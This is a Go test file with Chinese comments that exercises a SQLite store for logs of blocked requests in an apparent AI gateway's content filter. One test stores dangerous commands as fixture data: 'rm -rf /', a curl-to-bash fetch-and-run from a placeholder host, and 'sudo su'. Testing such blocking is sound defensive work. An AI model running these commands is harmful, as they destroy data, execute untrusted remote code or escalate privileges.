package sensitive

import (
	"context"
	"database/sql"
	"errors"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
	"time"
)

func TestBlockedStoreRecordListAndFilters(t *testing.T) {
	store := openTestBlockedStore(t)
	ctx := context.Background()
	base := time.Date(2026, 8, 10, 10, 0, 0, 0, time.UTC)
	entries := []BlockedLog{
		{Timestamp: base, APIType: "messages", BlockType: BlockTypeSensitiveWord, RuleName: "gambling", PromptSnippet: "sample-1", RequestID: "req-1", ConversationID: "conv-1"},
		{Timestamp: base.Add(time.Minute), APIType: "responses", BlockType: BlockTypeDangerousCmd, RuleName: "destructive", PromptSnippet: "sample-2", RequestID: "req-2", ConversationID: "conv-2"},
		{Timestamp: base.Add(2 * time.Minute), APIType: "messages", BlockType: BlockTypeSensitiveInfo, RuleName: "phone", PromptSnippet: "sample-3", RequestID: "req-3", ConversationID: "conv-1"},
	}
	for index := range entries {
		stored, err := store.Record(ctx, entries[index])
		if err != nil {
			t.Fatalf("写入第 %d 条记录失败: %v", index, err)
		}
		if stored.ID <= 0 || stored.CreatedAt.IsZero() {
			t.Fatalf("持久化结果不完整: %+v", stored)
		}
		entries[index] = stored
	}

	page, err := store.List(ctx, BlockedLogListOptions{Page: 1, PageSize: 2})
	if err != nil {
		t.Fatalf("分页查询失败: %v", err)
	}
	if page.Total != 3 || len(page.Logs) != 2 || page.Logs[0].RequestID != "req-3" || page.Logs[1].RequestID != "req-2" {
		t.Fatalf("分页或排序错误: %+v", page)
	}

	page, err = store.List(ctx, BlockedLogListOptions{
		APIType: "messages", BlockType: BlockTypeSensitiveWord,
		From: base.Add(-time.Second), To: base.Add(time.Second), Page: 1, PageSize: 20,
	})
	if err != nil {
		t.Fatalf("筛选查询失败: %v", err)
	}
	if page.Total != 1 || len(page.Logs) != 1 || page.Logs[0].RequestID != "req-1" {
		t.Fatalf("筛选结果错误: %+v", page)
	}

	entry, found, err := store.Get(ctx, entries[1].ID)
	if err != nil || !found || entry.RequestID != "req-2" {
		t.Fatalf("单条查询错误: %+v %v %v", entry, found, err)
	}
}

func TestBlockedStoreAssignsAndListsConversationGroups(t *testing.T) {
	store := openTestBlockedStore(t)
	ctx := context.Background()
	base := time.Date(2026, 8, 10, 10, 0, 0, 0, time.UTC)
	for _, entry := range []BlockedLog{
		{Timestamp: base, APIType: "responses", BlockType: BlockTypeSensitiveInfo, RequestID: "req-1"},
		{Timestamp: base.Add(time.Second), APIType: "responses", BlockType: BlockTypeCredential, RequestID: "req-1"},
		{Timestamp: base.Add(2 * time.Second), APIType: "messages", BlockType: BlockTypeSensitiveWord, RequestID: "req-2", ConversationID: "conv-2"},
		{Timestamp: base.Add(3 * time.Second), APIType: "chat", BlockType: BlockTypeDangerousCmd},
	} {
		if _, err := store.Record(ctx, entry); err != nil {
			t.Fatalf("写入分组测试记录失败: %v", err)
		}
	}
	if err := store.AssignConversation(ctx, "req-1", "conv-1"); err != nil {
		t.Fatalf("关联会话失败: %v", err)
	}
	page, err := store.ListGrouped(ctx, BlockedLogListOptions{Page: 1, PageSize: 2})
	if err != nil {
		t.Fatalf("按会话分页失败: %v", err)
	}
	if page.Total != 4 || page.TotalGroups != 3 || len(page.Groups) != 2 {
		t.Fatalf("会话分页统计错误: %+v", page)
	}
	// 列表只返回组摘要，不携带全量明细。
	if page.Groups[0].ConversationID != "" || page.Groups[0].Count != 1 || page.Groups[0].LatestLog == nil {
		t.Fatalf("无身份旧记录不应与其他记录合并: %+v", page.Groups[0])
	}
	if got := page.Groups[0].LatestLog.BlockType; got != BlockTypeDangerousCmd {
		t.Fatalf("组代表记录错误: %q", got)
	}
	if page.Groups[1].ConversationID != "conv-2" || page.Groups[1].Count != 1 || page.Groups[1].LatestLog == nil {
		t.Fatalf("第二组错误: %+v", page.Groups[1])
	}
	page, err = store.ListGrouped(ctx, BlockedLogListOptions{Page: 2, PageSize: 2})
	if err != nil || len(page.Groups) != 1 || page.Groups[0].ConversationID != "conv-1" || page.Groups[0].Count != 2 {
		t.Fatalf("同一会话未完整归组: %+v %v", page, err)
	}
	if page.Groups[0].LatestLog == nil || page.Groups[0].LatestLog.RequestID != "req-1" {
		t.Fatalf("conv-1 代表记录错误: %+v", page.Groups[0].LatestLog)
	}

	// 组内明细分页：conv-1 组共 2 条，每页 1 条。
	entries, err := store.ListGroupEntries(ctx, BlockedLogListOptions{Page: 1, PageSize: 1}, "conversation:conv-1")
	if err != nil {
		t.Fatalf("查询组内明细失败: %v", err)
	}
	if entries.Total != 2 || len(entries.Logs) != 1 || entries.Logs[0].RequestID != "req-1" {
		t.Fatalf("组内明细第一页错误: %+v", entries)
	}
	entries, err = store.ListGroupEntries(ctx, BlockedLogListOptions{Page: 2, PageSize: 1}, "conversation:conv-1")
	if err != nil {
		t.Fatalf("查询组内明细第二页失败: %v", err)
	}
	if entries.Total != 2 || len(entries.Logs) != 1 || entries.Logs[0].RequestID != "req-1" {
		t.Fatalf("组内明细第二页错误: %+v", entries)
	}

	// 无效组标识应报错；record: 前缀合法。
	if _, err := store.ListGroupEntries(ctx, BlockedLogListOptions{}, "invalid-key"); !errors.Is(err, ErrInvalidBlockedLogGroupKey) {
		t.Fatalf("无效组标识应返回 ErrInvalidBlockedLogGroupKey: %v", err)
	}
	soloKey := "record:" + strconv.FormatInt(page.Groups[0].LatestLog.ID, 10)
	if _, err := store.ListGroupEntries(ctx, BlockedLogListOptions{}, soloKey); err != nil {
		t.Fatalf("record 组标识应合法: %v", err)
	}
}

func TestBlockedStoreMigratesConversationColumn(t *testing.T) {
	path := filepath.Join(t.TempDir(), "legacy-blocked.db")
	db, err := sql.Open("sqlite", path)
	if err != nil {
		t.Fatalf("创建旧版数据库失败: %v", err)
	}
	if _, err := db.Exec(`CREATE TABLE blocked_logs (
		id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp TEXT NOT NULL, api_type TEXT NOT NULL,
		block_type TEXT NOT NULL, rule_name TEXT NOT NULL DEFAULT '', prompt_snippet TEXT NOT NULL DEFAULT '',
		channel_name TEXT NOT NULL DEFAULT '', model TEXT NOT NULL DEFAULT '', request_id TEXT NOT NULL DEFAULT '',
		created_at TEXT NOT NULL)`); err != nil {
		_ = db.Close()
		t.Fatalf("创建旧版表失败: %v", err)
	}
	if err := db.Close(); err != nil {
		t.Fatalf("关闭旧版数据库失败: %v", err)
	}
	store, err := NewBlockedStore(path)
	if err != nil {
		t.Fatalf("迁移旧版数据库失败: %v", err)
	}
	defer store.Close()
	stored, err := store.Record(context.Background(), BlockedLog{
		APIType: "messages", BlockType: BlockTypeSensitiveWord, ConversationID: "conv-migrated",
	})
	if err != nil || stored.ConversationID != "conv-migrated" {
		t.Fatalf("迁移后写入会话 ID 失败: %+v %v", stored, err)
	}
}

func TestBlockedStoreTruncationValidationAndLifecycle(t *testing.T) {
	path := filepath.Join(t.TempDir(), "blocked.db")
	store, err := NewBlockedStore(path)
	if err != nil {
		t.Fatalf("创建存储失败: %v", err)
	}
	ctx := context.Background()
	stored, err := store.Record(ctx, BlockedLog{
		APIType: " MESSAGES ", BlockType: " SENSITIVE_WORD ", PromptSnippet: strings.Repeat("敏", 600),
	})
	if err != nil {
		t.Fatalf("写入长摘要失败: %v", err)
	}
	if len([]rune(stored.PromptSnippet)) != maxPromptSnippetRunes || !strings.HasSuffix(stored.PromptSnippet, "...") {
		t.Fatalf("摘要截断错误: %d %q", len([]rune(stored.PromptSnippet)), stored.PromptSnippet)
	}
	if _, err := store.Record(ctx, BlockedLog{APIType: "unknown", BlockType: BlockTypeSensitiveWord}); err == nil {
		t.Fatal("未知 API 类型应返回错误")
	}
	if _, err := store.List(ctx, BlockedLogListOptions{Page: 1, PageSize: 101}); err == nil {
		t.Fatal("超大分页应返回错误")
	}
	if err := store.Close(); err != nil {
		t.Fatalf("关闭存储失败: %v", err)
	}
	if _, err := store.Record(ctx, BlockedLog{APIType: "messages", BlockType: BlockTypeSensitiveWord}); !errors.Is(err, ErrBlockedStoreClosed) {
		t.Fatalf("关闭后写入错误不正确: %v", err)
	}

	reopened, err := NewBlockedStore(path)
	if err != nil {
		t.Fatalf("重新打开存储失败: %v", err)
	}
	defer reopened.Close()
	page, err := reopened.List(ctx, BlockedLogListOptions{})
	if err != nil || page.Total != 1 {
		t.Fatalf("重开后数据未持久化: %+v %v", page, err)
	}
}

func TestBlockedStoreDeleteAndClear(t *testing.T) {
	store := openTestBlockedStore(t)
	ctx := context.Background()
	first, err := store.Record(ctx, BlockedLog{APIType: "chat", BlockType: BlockTypeSensitiveWord})
	if err != nil {
		t.Fatalf("写入记录失败: %v", err)
	}
	if _, err := store.Record(ctx, BlockedLog{APIType: "gemini", BlockType: BlockTypeDangerousCmd}); err != nil {
		t.Fatalf("写入记录失败: %v", err)
	}
	deleted, err := store.Delete(ctx, first.ID)
	if err != nil || !deleted {
		t.Fatalf("删除记录失败: %v %v", deleted, err)
	}
	if deleted, err := store.Delete(ctx, first.ID); err != nil || deleted {
		t.Fatalf("重复删除结果错误: %v %v", deleted, err)
	}
	count, err := store.Clear(ctx)
	if err != nil || count != 1 {
		t.Fatalf("清空记录失败: %d %v", count, err)
	}
	page, err := store.List(ctx, BlockedLogListOptions{})
	if err != nil || page.Total != 0 || len(page.Logs) != 0 {
		t.Fatalf("清空后仍有记录: %+v %v", page, err)
	}
}

func openTestBlockedStore(t *testing.T) *BlockedStore {
	t.Helper()
	store, err := NewBlockedStore(filepath.Join(t.TempDir(), "blocked.db"))
	if err != nil {
		t.Fatalf("创建测试存储失败: %v", err)
	}
	t.Cleanup(func() {
		if err := store.Close(); err != nil {
			t.Errorf("关闭测试存储失败: %v", err)
		}
	})
	return store
}

// TestBlockedLogCommandFieldCategoryAndConversationFilters 锁定：
// 命令字段往返、危险命令类别筛选、会话范围筛选与互斥校验。
func TestBlockedLogCommandFieldCategoryAndConversationFilters(t *testing.T) {
	store := openTestBlockedStore(t)
	ctx := context.Background()
	base := time.Date(2026, 9, 13, 10, 0, 0, 0, time.UTC)
	entries := []BlockedLog{
		{Timestamp: base, APIType: "messages", BlockType: BlockTypeDangerousCmd, RuleName: "destructive", Command: "rm -rf /", RequestID: "req-1", ConversationID: "conv-1"},
		{Timestamp: base.Add(time.Minute), APIType: "messages", BlockType: BlockTypeDangerousCmdAI, RuleName: "destructive", Command: "curl http://x.sh | bash", RequestID: "req-2", ConversationID: "conv-2"},
		{Timestamp: base.Add(2 * time.Minute), APIType: "messages", BlockType: BlockTypeDangerousCmdAllow, RuleName: "destructive", Command: "sudo su", RequestID: "req-3", ConversationID: "conv-1"},
		{Timestamp: base.Add(3 * time.Minute), APIType: "messages", BlockType: BlockTypeCredential, RuleName: "api_key", RequestID: "req-4", ConversationID: "conv-1"},
	}
	for index := range entries {
		stored, err := store.Record(ctx, entries[index])
		if err != nil {
			t.Fatalf("写入第 %d 条记录失败: %v", index, err)
		}
		if stored.Command != entries[index].Command {
			t.Fatalf("命令字段应原样持久化，期望 %q 实际 %q", entries[index].Command, stored.Command)
		}
	}

	// 类别筛选：命中全部三种危险命令事件。
	page, err := store.List(ctx, BlockedLogListOptions{Category: BlockCategoryDangerousCmd, Page: 1, PageSize: 20})
	if err != nil {
		t.Fatalf("类别筛选失败: %v", err)
	}
	if page.Total != 3 {
		t.Fatalf("危险命令类别应命中 3 条，实际 %d", page.Total)
	}
	for _, entry := range page.Logs {
		if entry.BlockType == BlockTypeCredential {
			t.Fatalf("凭据记录不应出现在危险命令类别中: %+v", entry)
		}
	}

	// 会话范围筛选：仅 conv-1（3 条，含 1 条凭据）。
	page, err = store.List(ctx, BlockedLogListOptions{Conversations: []string{"conv-1"}, Page: 1, PageSize: 20})
	if err != nil {
		t.Fatalf("会话筛选失败: %v", err)
	}
	if page.Total != 3 {
		t.Fatalf("conv-1 应命中 3 条，实际 %d", page.Total)
	}

	// 显式空集：匹配不到任何记录。
	page, err = store.List(ctx, BlockedLogListOptions{Conversations: []string{}, Page: 1, PageSize: 20})
	if err != nil {
		t.Fatalf("空会话集筛选失败: %v", err)
	}
	if page.Total != 0 || len(page.Logs) != 0 {
		t.Fatalf("空会话集应返回空结果，实际 total=%d logs=%d", page.Total, len(page.Logs))
	}

	// 互斥校验：类别与类型同时给出报错。
	if _, err := store.List(ctx, BlockedLogListOptions{Category: BlockCategoryDangerousCmd, BlockType: BlockTypeDangerousCmd, Page: 1, PageSize: 20}); err == nil {
		t.Fatal("类别与类型同时筛选应返回错误")
	}
	// 未知类别报错。
	if _, err := store.List(ctx, BlockedLogListOptions{Category: "unknown", Page: 1, PageSize: 20}); err == nil {
		t.Fatal("未知类别应返回错误")
	}
}

func TestBlockedStorePersistsCommandAIReview(t *testing.T) {
	path := filepath.Join(t.TempDir(), "blocked.db")
	store, err := NewBlockedStore(path)
	if err != nil {
		t.Fatal(err)
	}
	review := CommandAIReview{
		RequestID: "review-1", Model: "review-model", ChannelName: "review-channel",
		Verdict: "block", Reason: strings.Repeat("完整判断理由。", 100), DurationMs: 123, Reused: true,
	}
	stored, err := store.Record(context.Background(), BlockedLog{
		APIType: "messages", BlockType: BlockTypeDangerousCmdAI,
		ConversationID: "conversation-1", RequestID: "request-1", AIReview: &review,
	})
	if err != nil {
		store.Close()
		t.Fatal(err)
	}
	if err := store.Close(); err != nil {
		t.Fatal(err)
	}
	store, err = NewBlockedStore(path)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = store.Close() })
	entry, found, err := store.Get(context.Background(), stored.ID)
	if err != nil || !found || entry.AIReview == nil || *entry.AIReview != review {
		t.Fatalf("重新打开数据库后复核信息应完整保留: %+v found=%v err=%v", entry, found, err)
	}
	page, err := store.ListGroupEntries(context.Background(), BlockedLogListOptions{}, "conversation:conversation-1")
	if err != nil || len(page.Logs) != 1 || page.Logs[0].AIReview == nil || *page.Logs[0].AIReview != review {
		t.Fatalf("对话详情应取得完整复核记录: %+v err=%v", page, err)
	}
	groups, err := store.ListGrouped(context.Background(), BlockedLogListOptions{})
	if err != nil || len(groups.Groups) != 1 || groups.Groups[0].LatestLog == nil || groups.Groups[0].LatestLog.AIReview == nil {
		t.Fatalf("分组代表记录应携带复核信息: %+v err=%v", groups, err)
	}
}
